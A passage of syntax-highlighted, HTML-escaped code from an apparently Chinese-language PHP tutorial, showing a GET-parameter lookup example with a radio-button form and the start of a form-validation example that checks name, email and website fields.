&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;q&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;q&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;RUNOOB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;菜鸟教程&amp;lt;br&amp;gt;http://www.runoob.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;GOOGLE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;Google 搜索&amp;lt;br&amp;gt;http://www.google.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;TAOBAO&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;淘宝&amp;lt;br&amp;gt;http://www.taobao.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; 
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;radio&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;RUNOOB&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;Runoob
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;radio&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;GOOGLE&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;Google
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;radio&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;TAOBAO&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;Taobao
    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;提交&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;表单验证&#34;&gt;&lt;a href=&#34;#表单验证&#34; class=&#34;headerlink&#34; title=&#34;表单验证&#34;&gt;&lt;/a&gt;表单验证&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;HTML&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; 
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;utf-8&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;菜鸟教程(runoob.com)&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;
&lt;span class=&#34;token selector&#34;&gt;.error&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; #FF0000&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; 

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 定义变量并默认设置为空值&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$nameErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$emailErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$genderErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$websiteErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$comment&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;REQUEST_METHOD&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;POST&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$nameErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;名字是必需的&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;// 检测名字是否只包含字母跟空格&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/^[a-zA-Z ]*$/&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;token variable&#34;&gt;$nameErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;只允许字母和空格&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;email&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;token variable&#34;&gt;$emailErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;邮箱是必需的&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;email&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;// 检测邮箱是否合法&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;token variable&#34;&gt;$emailErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;非法邮箱格式&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;website&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;website&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;// 检测 URL 地址是否合法&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;amp;@#\/%=~_|]/i&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
